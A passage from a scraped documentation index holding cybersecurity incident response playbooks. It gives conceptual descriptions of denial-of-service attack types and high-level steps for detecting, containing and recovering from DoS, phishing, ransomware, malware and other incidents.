because of the web server becoming slow or unresponsive to authorised users.  ","version":"Next","tagName":"h3"},{"title":"2.4 Ping Flood (ICMP Flood)​","type":1,"pageTitle":"Denial of Service Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Denial of Service Incident Response Playbook#24-ping-flood-icmp-flood","content":" Ping Flood attacks, sometimes referred to as &quot;Ping of Death&quot; or ICMP Flood attacks, overwhelm the target system with an endless barrage of Internet Control Message Protocol (ICMP) echo request packets. These packets, which take advantage of flaws in operating systems or network devices, are sent quickly and are usually larger than the allowed size. The target machine experiences sluggish performance or even crashes because of overusing its CPU and network resources processing these packets. Ping Flood assaults are hard to counter because they might originate from several sources at once and are reasonably easy to carry out.  ","version":"Next","tagName":"h3"},{"title":"2.5 Slowloris​","type":1,"pageTitle":"Denial of Service Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Denial of Service Incident Response Playbook#25-slowloris","content":" Attacks known as &quot;slowloris&quot; are named after the way they use server resources—low and slow. Slowloris keeps a small number of connections active for a long time rather than flooding the server with requests. Attackers make sure that every connection is active by sending HTTP headers to the server very slowly. Slowloris stops authentic users from creating new connections by filling the server's connection slots with incomplete requests. A denial-of-service attack against authorised users attempting to access the web server may result from this resource exhaustion approach.  ","version":"Next","tagName":"h3"},{"title":"2.6 DNS Amplification​","type":1,"pageTitle":"Denial of Service Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Denial of Service Incident Response Playbook#26-dns-amplification","content":" DNS Amplification attacks exploit vulnerabilities in DNS servers to amplify the volume of traffic directed at the target system. Attackers send small DNS queries with a spoofed source IP address to vulnerable DNS servers, requesting large DNS responses. These responses, which are much larger than the original queries, are directed towards the victim's IP address, overwhelming its network bandwidth. DNS Amplification attacks leverage the inherent trust between DNS servers, making it difficult to trace the origin of the attack.  ","version":"Next","tagName":"h3"},{"title":"2.7 NTP Amplification​","type":1,"pageTitle":"Denial of Service Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Denial of Service Incident Response Playbook#27-ntp-amplification","content":" NTP amplification attacks are comparable to DNS amplification attacks in that they increase the amount of traffic going to the target system by taking advantage of vulnerable Network Time Protocol (NTP) servers. Attackers make small NTP queries to NTP servers, asking huge NTP answers, using a faked source IP address. The victim's IP address is the target of these replies, which are usually significantly larger than the initial queries and interrupt services by congesting the network. Because the NTP protocol is UDP-based, NTP amplification attacks are challenging to counter.  ","version":"Next","tagName":"h3"},{"title":"2.8 Smurf Attack​","type":1,"pageTitle":"Denial of Service Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Denial of Service Incident Response Playbook#28-smurf-attack","content":" Smurf Attacks increase the amount of traffic going towards the target system by taking advantage of IP networks' ICMP Echo Reply functionality. A lot of ICMP echo request (ping) packets are sent by attackers to IP broadcast addresses, pretending that the victim's IP address is the originating IP address. As a result, the victim's IP address triggers responses from every computer on the network, exceeding its available bandwidth and resources.  ","version":"Next","tagName":"h3"},{"title":"3 Stakeholders​","type":1,"pageTitle":"Denial of Service Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Denial of Service Incident Response Playbook#3-stakeholders","content":" IT Administration: The IT administration oversees the organization's servers, networks, and other IT infrastructure. They are essential in identifying, assessing, and minimising a denial-of-service attack in addition to organising the response to the occurrence.Cyber Incident Response Team: An organization's cyber security incident response team (CSIRT) is a specialised unit tasked with handling security incidents and breaches. Their main objective is to quickly locate, contain, and address issues to lessen their effects. CSIRTs are essential for safeguarding an organization's priceless assets, good name, and customers.External Service Providers: For a variety of IT services, companies may depend on outside vendors like internet service providers (ISPs), cloud service providers, or managed security service providers (MSSPs). By working together with these suppliers, the company can better respond to the denial-of-service attack and make use of more resources and experience.Technical Support Team: To troubleshoot and resolve technical issues associated with the DoS attack, the technical support team provides assistance. They can assist in promptly returning regular operations to normal and offer support to end customers impacted by the occurrence.End Users: If the DoS attack prevents end users from accessing services or apps, it could influence them. Minimising the impact on the position they hold can be achieved by keeping them updated on the situation and offering advice on workarounds or substitute solutions.Senior Management/Executive Leadership: In deciding how to respond to the DoS attack, senior management, or executive leadership assigns resources, sets strategic direction, and takes choices. They could also be in charge of maintaining the organization's reputation and dealing with outside stakeholders.  ","version":"Next","tagName":"h2"},{"title":"4 Flow Diagram​","type":1,"pageTitle":"Denial of Service Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Denial of Service Incident Response Playbook#4-flow-diagram","content":"   Preparation (Pink) Develop and maintain Cyber Incident Response Plan (CIRP) for DoS incidents.Identify critical assets and prioritize them.Train incident response teams and employees. Detection (Orange) Continuously monitor network traffic.Set up alerts for suspicious patterns.Validate incidents. Analysis (Yellow) Investigate attack vectors and affected systems.Collaborate with relevant teams. Containment (Green) Implement immediate mitigation measures.Isolate affected systems.Communicate progress. Eradication (Blue) Identify vulnerabilities.Patch and remediate.Verify closure of attack vector. Recovery (Red) Gradually restore services.Validate restoration.Monitor for recurrence. Post-Incident Review (Brown) Conduct a thorough review.Learn from the incident.Update the CIRP.  ","version":"Next","tagName":"h2"},{"title":"5 Incident Response Stages​","type":1,"pageTitle":"Denial of Service Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Denial of Service Incident Response Playbook#5-incident-response-stages","content":" ","version":"Next","tagName":"h2"},{"title":"5.1 Preparation​","type":1,"pageTitle":"Denial of Service Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Denial of Service Incident Response Playbook#51-preparation","content":" Objective: Establish a robust foundation for effective incident response. Key Actions Risk Assessment: Use thorough risk assessments to find possible DoS vulnerabilities in systems, apps, and network infrastructure.Creating Cyber Incident Response Plan(CIRP): Make a thorough incident response plan for handling denial-of-service (DoS) incidents. Establish communication routes, escalation protocols, and roles and duties.Resource Allocation: Ensure that the people, equipment, and technologies required to support incident response activities are available.Training and Awareness: To improve staff members' comprehension of DoS risks, detection methods, and response protocols, offer training and awareness programmes.Form an Incident Response Team: Assign people to specific areas of handling the response to denial-of-service (DoS) situations in order to create a specialised team.  ","version":"Next","tagName":"h3"},{"title":"5.2 Detection​","type":1,"pageTitle":"Denial of Service Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Denial of Service Incident Response Playbook#52-detection","content":" Objective: Promptly identify and confirm the occurrence of DoS attacks. Key Actions Monitoring and Alerting: To identify indications of unusual behaviour suggestive of a denial-of-service attack, continuously monitor network traffic, system performance metrics, and security logs.Anomaly Detection: Use intrusion detection/prevention systems (IDS/IPS), network traffic analysis tools, and security information and event management (SIEM) systems to identify strange patterns or abrupt increases in traffic volume that could be signs of a denial-of-service assault.Alert Triage: Set alerts produced by monitoring systems in order of priority and look into them to see whether they point to a possible DoS assault. Correlate alerts with several data sources to validate them.  ","version":"Next","tagName":"h3"},{"title":"5.3 Analysis​","type":1,"pageTitle":"Denial of Service Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Denial of Service Incident Response Playbook#53-analysis","content":" Objective: Conduct in-depth analysis of the DoS attack to understand its nature, scope, and impact. Key Actions Traffic Analysis: Examine network traffic patterns to determine the nature of the traffic, source IP addresses, and services or apps that are being targeted in order to determine the characteristics of the DoS attack.Log analysis: Look through firewall logs, system logs, and other pertinent log data to find any unusual activity or attempted illegal access that may have been connected to the DoS incident.Forensic Investigation: Gather and store digital evidence connected to the DoS assault for forensic examination. Memory dumps, system snapshots, and packet captures are a few examples of this.Root produce Analysis: Find the vulnerabilities or misconfigurations that the attacker may have exploited in order to trigger the denial of service (DoS) incident.  ","version":"Next","tagName":"h3"},{"title":"5.4 Containment​","type":1,"pageTitle":"Denial of Service Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Denial of Service Incident Response Playbook#54-containment","content":" Objective: Limit the impact of the attack and prevent its spread. Key Actions Traffic Filtering: To stop or filter malicious traffic linked to the DoS attack, use firewall rules, access control lists (ACLs), and other network filtering techniques.Rate limitation: To reduce excessive traffic flows and avoid network congestion, use rate limitation or traffic shaping techniques.Isolation: To stop the DoS attack from spreading and lessen its effects on other infrastructure components, isolate the compromised systems or network segments.Cloud-Based Mitigation: Use content delivery networks (CDNs) or cloud-based mitigation services to reduce the amount of DoS attack traffic before it enters the network perimeter of the company.  ","version":"Next","tagName":"h3"},{"title":"5.5 Eradication​","type":1,"pageTitle":"Denial of Service Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Denial of Service Incident Response Playbook#55-eradication","content":" Objective: Eliminate the root cause of the attack and remove the presence of the attacker. Key Actions Patch and Update Deployment: To address vulnerabilities that the attacker exploited and stop future denial-of-service assaults, apply patches, security updates, and configuration modifications.System Hardening: To strengthen systems and lessen their vulnerability to DoS attacks, take additional security precautions. Some of them include turning off unused services, tightening access limits, and putting security best practices into practice.Network Redesign: To increase resilience and better withstand DoS assaults, think about revamping the network architecture or implementing more network security measures.  ","version":"Next","tagName":"h3"},{"title":"5.6 Recovery​","type":1,"pageTitle":"Denial of Service Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Denial of Service Incident Response Playbook#56-recovery","content":" Objective: Restore normal operations. Key Actions System Restoration: Assure data integrity and uninterrupted operations by restoring impacted systems and services from backups.Service Verification: To make sure the restored systems and services are operating correctly and securely, thoroughly test and verify them.Communication with Stakeholders: Give advice on how to resume regular activities and update stakeholders on the status of the recovery efforts.  ","version":"Next","tagName":"h3"},{"title":"5.7 Post-Incident Review​","type":1,"pageTitle":"Denial of Service Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Denial of Service Incident Response Playbook#57-post-incident-review","content":" Objective: Conduct a comprehensive review of the DoS incident response process to learn from the incident and improve future response. Key Actions Debriefing: Conduct a debriefing session with the members of the incident response team to evaluate the success of the response efforts and pinpoint any obstacles that may have arisen.Root Cause Analysis: To determine the underlying causes of the DoS occurrence, such as security control gaps or vulnerabilities, conduct a root cause analysis.Documentation of Lessons Learned: Provide a record of the takeaways that were discovered from the DoS incident, outlining effective response tactics, areas that require development, and suggestions for improving incident response capabilities.Updates to the Incident Response Plan: To resolve identified shortcomings and integrate improvements, update the incident response plan in light of the post-event review results.  ","version":"Next","tagName":"h3"},{"title":"6 Terminology​","type":1,"pageTitle":"Denial of Service Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Denial of Service Incident Response Playbook#6-terminology","content":" CIRP (Cyber Incident Response Plan): It is a documented set of procedures and guidelines for organization to follow when responding to and managing security incidents. It outlines roles, responsibilities, communication channels, and technical steps necessary to detect, analyse, contain, eradicate, and recover from incidents. It is essential to have a well-prepared CIRP for effective incident response and minimizing the impact of security threats. CSIRT (Cyber Security Incident Response Team): It an expert group that handles cyber security incidents. They are responsible for detecting, analysing, containing, eradicating, and recovering from security incidents affecting an organization. CSIRTs play a critical role in safeguarding an organization’s assets and maintaining trust with stakeholders. UDP (User Datagram Protocol): It is a communication protocol used for time-sensitive transmissions such as video playback or DNS lookups. It does not establish a connection before data transfer and directly send them to a target computer without checking whether they arrived as intended or indicating their order. TCP three-way handshake: It is a protocol for establishing a connection between a server and a client in a TCP/IP network. It involves three steps: client sends a SYN segment to the server, server responds with a SYN-ACK segment, client acknowledges the server’s response with an ACK segment and establishing a reliable connection for data transfer. ","version":"Next","tagName":"h2"},{"title":"Incident Response Playbooks","type":0,"sectionRef":"#","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/incident-response","content":"","keywords":"","version":"Next"},{"title":"Attacks​","type":1,"pageTitle":"Incident Response Playbooks","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/incident-response#attacks","content":" ","version":"Next","tagName":"h2"},{"title":"Denial of Service (DoS) Attack Playbook​","type":1,"pageTitle":"Incident Response Playbooks","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/incident-response#denial-of-service-dos-attack-playbook","content":" Preparation: Documentation: Make a list of critical services and their expected behaviour. Monitoring Tools: Implement network traffic and service availability monitoring solutions. Response Team: Assign roles and responsibilities for immediate response.  Identification: Identify sudden spikes in network traffic or service outages. Analyze Traffic: Identify the source and type of the DoS attack.  Notification: Internal Alert: Notify the incident response team and any other stakeholders who may be affected. Service Users: Notify users of potential service disruptions and expected resolutions.  Containment: Filtering traffic: Use filters or firewall rules to prevent malicious traffic. Service Rerouting: Reroute legitimate traffic away from affected systems.  Eradication: Analyse Attack: Investigate the attack vectors to learn about vulnerabilities. Implement Countermeasures: To prevent future attacks, install patches or configure your system.  Recovery: Service Restoration: Gradually restore affected services after ensuring the attack is mitigated. System Checks: Verify the integrity of affected systems and data.  Post-Incident: Lessons Learned: Conduct a post-incident investigation and document your findings. Enhancements: Make security improvements to prevent similar attacks in the future.  ","version":"Next","tagName":"h3"},{"title":"Phishing Attack Playbook​","type":1,"pageTitle":"Incident Response Playbooks","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/incident-response#phishing-attack-playbook","content":" Preparation: Training: Conduct regular phishing awareness training for employees. Email Filtering: Use email filtering solutions to detect phishing emails.  Identification: Employee Reports: Encourage employees to promptly report suspicious emails. Email Analysis: Examine reported emails for phishing indicators.  Notification: Internal Alert: Notify the incident response team and affected employees immediately. User Awareness: Educate employees about the phishing attack and precautionary measures.  Containment: Isolation: Isolate affected systems to prevent further compromise. Password Resets: Begin password resets for affected accounts.  Eradication: Email Blacklisting: Blacklist sender domains or addresses associated with the phishing campaign. Security Updates: Ensure all systems are updated with the latest security patches.  Recovery: System Checks: Scan systems for any malware or unauthorized access. User Training: Reinforce phishing awareness and best practices.  Post-Incident: Analysis: Review the incident to identify weaknesses in security measures. Enhancements: Implement improvements in email filtering and employee training.  ","version":"Next","tagName":"h3"},{"title":"Ransomware Attack Playbook​","type":1,"pageTitle":"Incident Response Playbooks","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/incident-response#ransomware-attack-playbook","content":" Preparation: Backup Strategy: Establish and maintain regular backups of critical data. Security Software: Implement robust antivirus and anti-ransomware solutions. Employee Training: Educate employees on recognizing suspicious files or links.  Identification: Anomaly Detection: Monitor for unusual file changes or encryption activities. Ransom Note: Identify and analyze ransom notes or indicators of compromise.  Notification: Immediate Alert: Notify the incident response team and affected stakeholders. Isolation: Disconnect affected systems from the network to prevent further encryption.  Containment: Identify Scope: Assess the extent of encrypted files and affected systems. Quarantine: Isolate infected systems to contain the spread.  Eradication: Malware Removal: Utilize antivirus tools to remove ransomware from affected systems. Data Recovery: Restore encrypted data from backups.  Recovery: System Restoration: Gradually restore affected systems after ensuring malware removal. Security Checks: Perform security checks to prevent reinfection.  Post-Incident: Review Backup Policy: Assess backup frequency and integrity. Enhancements: Strengthen security measures to prevent future ransomware attacks.  ","version":"Next","tagName":"h3"},{"title":"Malware Attack Playbook​","type":1,"pageTitle":"Incident Response Playbooks","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/incident-response#malware-attack-playbook","content":" Preparation: Security Software: Implement robust antivirus and malware detection solutions. Employee Education: Train employees on safe browsing and downloading practices.  Identification: Anomaly Detection: Monitor for suspicious behavior or file changes. Antivirus Alerts: Respond to antivirus alerts indicating potential malware.  Notification: Internal Alert: Notify the incident response team and relevant stakeholders. System Isolation: Isolate infected systems from the network.  Containment: Malware Quarantine: Quarantine infected files or systems to prevent further spread. Access Control: Limit user access to prevent malware propagation.  Eradication: Malware Removal: Use antivirus tools to eradicate malware from affected systems. Patch and Update: Apply patches to address vulnerabilities exploited by the malware.  Recovery: System Restoration: Gradually restore affected systems after malware removal. User Training: Reinforce training on malware prevention.  Post-Incident: Analysis: Review the incident for lessons learned and identify security gaps. Enhancements: Improve malware detection and prevention measures.  ","version":"Next","tagName":"h3"},{"title":"Data Breach Playbook​","type":1,"pageTitle":"Incident Response Playbooks","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/incident-response#data-breach-playbook","content":" Preparation: Data Classification: Classify and prioritize sensitive data for protection. Access Control: Implement strict access controls and encryption measures.  Identification: Anomaly Detection: Monitor for unauthorized access or unusual data transfers. Data Audit: Analyze logs and databases for potential breaches.  Notification: Immediate Alert: Notify the incident response team and relevant authorities. Affected Parties: Inform individuals affected by the breach.  Containment: Data Segmentation: Isolate compromised data to prevent further access. System Lockdown: Secure affected systems to prevent additional breaches.  Eradication: Vulnerability Patching: Address vulnerabilities that led to the breach. Data Restoration: Restore affected data from secure backups.  Recovery: Compliance Check: Ensure compliance with data protection regulations. Incident Review: Conduct a review to prevent similar breaches.  Post-Incident: Security Enhancements: Strengthen security measures based on the breach analysis. Communication Strategy: Develop communication plans for future breaches.  ","version":"Next","tagName":"h3"},{"title":"Industrial Control System Compromise Playbook​","type":1,"pageTitle":"Incident Response Playbooks","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/incident-response#industrial-control-system-compromise-playbook","content":" Preparation: Segmentation: Segment ICS networks from external networks for added security. Regular Audits: Conduct regular security audits and assessments of ICS systems.  Identification: Anomaly Detection: Monitor for unusual activities or commands in the ICS environment. Behavior Analysis: Analyze ICS behavior for deviations from normal operations.  Notification: Immediate Alert: Notify the incident response team and ICS personnel. System Isolation: Isolate compromised ICS systems to prevent further damage.  Containment: Disabling Access: Disable compromised control systems or segments. Backup Systems: Activate backup systems if available.  Eradication: Malware Removal: Remove malware or unauthorized software from ICS systems. Security Updates: Apply patches and updates to secure vulnerabilities.  Recovery: System Restoration: Gradually restore ICS functionality after ensuring security measures. Testing: Test restored systems for functionality and security.  Post-Incident: Analysis and Review: Conduct a thorough review of the incident for ICS security improvements. Training and Preparedness: Provide training on incident response for ICS personnel.  ","version":"Next","tagName":"h3"},{"title":"Vectors​","type":1,"pageTitle":"Incident Response Playbooks","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/incident-response#vectors","content":" ","version":"Next","tagName":"h2"},{"title":"External/Removable Media Vector Playbook​","type":1,"pageTitle":"Incident Response Playbooks","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/incident-response#externalremovable-media-vector-playbook","content":" Preparation: Policy Development: Create policies for the use of external media devices. Security Software: Endpoint security software should be used to scan and monitor external media.  Identification: Monitoring: Regularly scan systems for connected external media devices. Anomaly Detection: Identify unusual file transfers or unauthorised access.  Notification: Alert System: Set up alerts for the incident response team when unauthorised media access is detected. User Awareness: Educate users on the dangers of using external media.  Containment: Disconnecting Media: Separate the affected systems from the external media device. Access Control: To prevent further data transfer, restrict access.  Eradication: Malware Scans: Scan affected systems for malware. Policy Review: Policy for external media usage should be evaluated and updated.  Recovery: System Restoration: Clean backups should be used to restore affected systems. User Training: Reinforce training on safe use of external media.  Post-Incident: Policy Enhancement: Based on incident analysis, strengthen policies governing the use of external media. Monitoring Improvements: Improve monitoring for external media access.  ","version":"Next","tagName":"h3"},{"title":"Attrition Vector Playbook​","type":1,"pageTitle":"Incident Response Playbooks","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/incident-response#attrition-vector-playbook","content":" Preparation: Asset Inventory: Keep an up-to-date inventory of critical assets. Backup Strategy: Back up critical data and assets on a regular basis.  Identification: Monitoring: Keep an eye on systems for unusual attrition or data deletion. Audit Trails: Examine logs for evidence of unauthorised access or data deletion attempts.  Notification: Immediate Alert: Notify the incident response team and any stakeholders who are affected. Data Loss Analysis: Determine the extent and impact of the data loss.  Containment: Halting Attrition: Isolate affected systems to prevent further data loss. Access Control: Limit access to avoid further attrition.  Eradication: Data Recovery: Attempt to recover lost data from backups or sources. System Checks: Perform integrity checks on the affected systems.  Recovery: Data Restoration: Gradually restore lost data after ensuring the security of systems. Training and Awareness: Users should be educated on data security best practices.  Post-Incident: Review and Analysis: Conduct a post-mortem investigation to avoid future attrition incidents. Enhancements: Enhance security measures to prevent unauthorized data deletion.  ","version":"Next","tagName":"h3"},{"title":"Web Vector Playbook​","type":1,"pageTitle":"Incident Response Playbooks","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/incident-response#web-vector-playbook","content":" Preparation: Web Filtering: Implement web filtering tools to block malicious sites. Browser Security: Enforce secure browser settings and plugins.  Identification: Anomaly Detection: Examine web traffic for suspicious or unauthorised activity. Behavior Analysis: Examine user behaviour for signs of web-based threats.  Notification: Alert System: Notify the incident response team upon detecting suspicious web activities. User Awareness: Educate users about safe browsing habits.  Containment: Blocking Access: Block access to suspicious or compromised websites. Quarantine Systems: To prevent further compromise, isolate affected systems.  Eradication: Malware Scans: Perform scans for malware or web-based threats on affected systems. Patch Management: Apply patches to address vulnerabilities discovered via web vectors.  Recovery: System Restoration: Gradually restore affected systems after malware removal and patching. User Training: Reinforce training on safe web browsing practices.  Post-Incident: Analysis and Review: Review the incident to enhance web security measures. Continuous Monitoring: Implement enhanced web-based threat monitoring.  ","version":"Next","tagName":"h3"},{"title":"Email Vector Playbook:​","type":1,"pageTitle":"Incident Response Playbooks","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/incident-response#email-vector-playbook","content":" Preparation: Email Filtering: Deploy email filtering solutions to detect and block phishing attempts. Employee Training: Conduct regular phishing awareness training for employees.  Identification: Employee Reports: Encourage employees to report suspicious emails promptly. Email Analysis: Analyze reported emails for phishing or malware indicators.  Notification: Internal Alert: Notify the incident response team and affected users. User Education: Inform users about the email-based threat and precautionary measures.  Containment: Isolation: Isolate affected systems to prevent further compromise. Password Resets: Initiate password resets for compromised accounts.  Eradication: Email Blacklisting: Blacklist sender domains or addresses linked to the threat. Security Updates: Apply patches to address vulnerabilities exploited through email. System Checks: Examine systems for malware and unauthorised access. Training Reinforcement: Reinforce training on email security best practices.  Post-Incident: Review and Analysis: Analyze the incident to enhance email security measures. Training Enhancement: Improve employee training based on incident findings.  ","version":"Next","tagName":"h3"},{"title":"Supply Chain Interdiction Vector Playbook:​","type":1,"pageTitle":"Incident Response Playbooks","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/incident-response#supply-chain-interdiction-vector-playbook","content":" Preparation: Vendor Assessment: Assess and monitor the security posture of third-party vendors. Contractual Requirements: Establish security requirements in contracts with suppliers.  Identification: Monitoring: Monitor supply chain connections and activities for anomalies. Supplier Communication: Communicate and verify with suppliers in case of suspicious activities.  Notification: Incident Response Team: Notify the team about suspected supply chain interdiction. Supplier Notification: Inform affected suppliers and collaborate on containment.  Containment: Isolation: Isolate affected systems or components in the supply chain. Alternative Sourcing: Identify alternative suppliers to mitigate disruptions.  Eradication: Investigation: Investigate the root cause within the supply chain. Security Updates: Apply patches or updates to secure affected systems.  Recovery: Supply Chain Restoration: Gradually reintegrate verified supply chain components. Monitoring: Check the security of the restored supply chain elements.  Post-Incident: Supplier Review: Conduct a thorough review of supplier security practices. Supply Chain Strengthening: Implement measures to fortify the supply chain against interdiction.  ","version":"Next","tagName":"h3"},{"title":"Impersonation Vector Playbook:​","type":1,"pageTitle":"Incident Response Playbooks","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/incident-response#impersonation-vector-playbook","content":" Preparation: Authentication Measures: Implement multi-factor authentication to prevent impersonation. Employee Training: Train employees to recognize and report impersonation attempts.  Identification: Anomaly Detection: Monitor for unusual user access patterns or attempts. Behavior Analysis: Analyze user behavior for signs of unauthorized access.  Notification: Incident Response Team: Notify the team about suspected impersonation attempts. User Awareness: Educate users about potential impersonation threats. Account Lockdown: Disable compromised accounts to prevent further access. Access Review: Review access logs and permissions for irregularities.  Eradication: User Verification: Verify compromised accounts and restore access securely. Security Checks: Ensure no unauthorized changes were made during the incident.  Recovery: System Checks: Perform system checks to ensure no lingering threats. Training Reinforcement: Reinforce training on recognizing and reporting impersonation.  Post-Incident: Analysis and Review: Analyze the incident to strengthen measures against impersonation. Continuous Monitoring: Enhance monitoring for potential impersonation threats.  ","version":"Next","tagName":"h3"},{"title":"Improper Usage Vector Playbook:​","type":1,"pageTitle":"Incident Response Playbooks","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/incident-response#improper-usage-vector-playbook","content":" Preparation: User Policies: Establish clear policies on acceptable use of resources and systems. Monitoring Tools: Implement monitoring solutions to detect policy violations.  Identification: Anomaly Detection: Monitor for unusual or unauthorized activities on systems. Policy Violation Analysis: Analyze logs for indications of improper usage.  Notification: Incident Response Team: Notify the team about detected improper usage incidents. User Education: Inform users about policy violations and their consequences.  Containment: Access Control: Restrict access to systems involved in improper usage. User Suspension: Suspend user privileges if necessary to prevent further violations.  Eradication: Investigation: Investigate the root cause and extent of improper usage. Policy Review: Review and update policies to prevent future violations.  Recovery: System Checks: Ensure systems are free from unauthorized changes or data loss. User Training: Reinforce training on proper system and resource usage.  Post-Incident: Policy Enhancement: Enhance policies based on incident analysis to prevent future improper usage. Monitoring Improvements: Strengthen monitoring for policy violations.  ","version":"Next","tagName":"h3"},{"title":"Loss/Theft of Equipment Vector Playbook:​","type":1,"pageTitle":"Incident Response Playbooks","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/incident-response#losstheft-of-equipment-vector-playbook","content":" Preparation: Asset Management: Maintain an inventory of all equipment with sensitive data. Encryption Measures: Encrypt sensitive data on portable devices. Inventory Audits: Regularly audit equipment inventory for discrepancies. Tracking Tools: Use tracking solutions to identify lost or stolen equipment.  Notification: Immediate Alert: Notify the incident response team and relevant stakeholders. Data Assessment: Evaluate the potential impact of lost or stolen equipment.  Containment: Remote Wipe: Remotely wipe data from lost or stolen devices if possible. Access Control: Change access credentials to prevent unauthorized access.  Eradication: Recovery Attempts: Attempt recovery or tracking of lost equipment. Security Updates: Apply security updates or patches to prevent data breaches.  Recovery: Data Restoration: Restore lost data from backups or alternative sources. Policy Review: Review and update policies on equipment handling and data security.  Post-Incident: Analysis and Review: Conduct a post-mortem analysis to enhance equipment security measures. Security Measures: Implement additional security measures to prevent data exposure from lost equipment. ","version":"Next","tagName":"h3"},{"title":"Malware-Outbreak Incident Response Playbook","type":0,"sectionRef":"#","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Malware Outbreak Incident Response Playbook","content":"","keywords":"","version":"Next"},{"title":"1. Introduction​","type":1,"pageTitle":"Malware-Outbreak Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Malware Outbreak Incident Response Playbook#1-introduction","content":" Data integrity, reputation, and company operations are all seriously at danger from malware outbreaks. To reducing harm and guaranteeing business continuity, timely malware incident identification, containment, and mitigation are essential. This playbook offers a systematic approach for managing malware outbreaks, defining roles, duties, and procedures to enable a successful response.  ","version":"Next","tagName":"h2"},{"title":"1.1 Overview​","type":1,"pageTitle":"Malware-Outbreak Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Malware Outbreak Incident Response Playbook#11-overview","content":" The incident response playbook for malware outbreaks provides a structured approach to locating, stopping, eliminating, and recovering from attacks by malware. It seeks to expedite reaction efforts and lessen the effect of malware breakouts on organisational assets and stakeholders by creating defined protocols and communication channels.  ","version":"Next","tagName":"h3"},{"title":"1.2 Purpose​","type":1,"pageTitle":"Malware-Outbreak Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Malware Outbreak Incident Response Playbook#12-purpose","content":" This playbook's goals are to:  Provide a uniform procedure for tackling malware outbreaks to guarantee consistency and effectiveness in incident management.To stop malware from spreading further and to reduce damage, make it easier for occurrences to be quickly detected and contained.Reduce the impact of malware outbreaks on company operations and lower the financial losses they cause.During incident response activities, encourage cooperation, coordination, and communication amongst response teams, stakeholders, and other relevant parties.  ","version":"Next","tagName":"h3"},{"title":"1.3 Attack Definition​","type":1,"pageTitle":"Malware-Outbreak Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Malware Outbreak Incident Response Playbook#13attack-definition","content":" Malware is software that is intentionally created to cause harm, interfere with operations, or obtain unauthorised access to data, networks, and computer systems. It includes a wide range of dangers, including as trojans, worms, viruses, ransomware, and spyware. Multiple routes, including portable media, malicious websites, email attachments, and software flaws, can lead to malware epidemics.  ","version":"Next","tagName":"h3"},{"title":"1.4 Scope​","type":1,"pageTitle":"Malware-Outbreak Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Malware Outbreak Incident Response Playbook#14-scope","content":" The events regarding the malware outbreak on the computers, networks, and endpoints of the company are covered in this playbook. It includes malware problems, both external and internal, that impact stakeholders, data assets, and company processes. This playbook covers all occurrences requiring an integrated effort, regardless of the type of malware or transmission technique.  ","version":"Next","tagName":"h3"},{"title":"2. Attack Types​","type":1,"pageTitle":"Malware-Outbreak Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Malware Outbreak Incident Response Playbook#2-attack-types","content":" Malware outbreaks may take many different shapes, and responding to each one presents different difficulties for incident response teams. Malware outbreaks are often linked to the following attack types:  ","version":"Next","tagName":"h2"},{"title":"2.1 Worms​","type":1,"pageTitle":"Malware-Outbreak Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Malware Outbreak Incident Response Playbook#21-worms","content":" Worms are viruses that reproduce themselves and travel around networks, taking advantage of security holes to quickly infect linked computers.  Signs of Worm Activity:  Unusual network traffic increases, suggesting extensive spreading.Worm replication is the cause of the network's rapid bandwidth usage.Increased memory or CPU consumption on compromised computers.System logs containing files or processes that are unknown.Random system restarts or crashes brought on by worm activity.  ","version":"Next","tagName":"h3"},{"title":"2.2 Trojans​","type":1,"pageTitle":"Malware-Outbreak Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/RED TEAM/playbooks/Malware Outbreak Incident Response Playbook#22-trojans","content":" Trojan horses pose as trustworthy applications to deceive users into downloading and running 